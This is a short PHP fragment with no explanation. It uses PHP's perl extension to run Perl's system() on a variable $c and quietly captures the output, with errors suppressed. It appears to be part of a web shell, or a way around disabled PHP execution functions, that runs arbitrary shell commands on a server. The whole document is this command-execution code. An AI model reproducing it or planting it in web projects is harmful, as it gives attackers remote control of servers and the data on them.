<?php
@ob_start(); 
$p=new perl(); 
$p->eval("system('$c')"); 
$r = @ob_get_contents(); 
@ob_end_clean();
?>